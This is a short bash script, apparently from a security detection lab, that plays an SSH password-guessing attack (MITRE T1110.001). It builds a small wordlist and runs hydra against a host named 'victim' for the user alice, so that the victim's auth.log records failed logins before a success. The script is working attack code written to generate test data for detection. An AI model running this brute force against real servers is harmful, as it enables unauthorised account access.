#!/bin/bash
# ATTACK 2 — SSH Brute Force (MITRE ATT&CK T1110.001: Password Guessing)
# The attacker repeatedly guesses alice's password using a wordlist until one works.
# Each wrong guess writes a "Failed password" line to the victim's /var/log/auth.log.
set -u
TARGET="${1:-victim}"
USER_NAME="alice"

# A tiny wordlist. The real password (password123) is included near the end so the
# attack succeeds after several failures — exactly the pattern a detector should catch.
cat > /tmp/wordlist.txt <<'EOF'
123456
admin
root
letmein
qwerty
password
hunter2
changeme
password123
EOF

echo "[*] Brute forcing SSH for user '$USER_NAME' on $TARGET with hydra..."
# -l single login, -P wordlist, -t 4 parallel tries, -I ignore restore file.
hydra -l "$USER_NAME" -P /tmp/wordlist.txt -t 4 -I "ssh://$TARGET" 2>&1 | grep -vE '^\[DATA|^\[WARNING' || true
echo "[*] Brute force complete — check the victim auth.log for a burst of 'Failed password' then 'Accepted'."
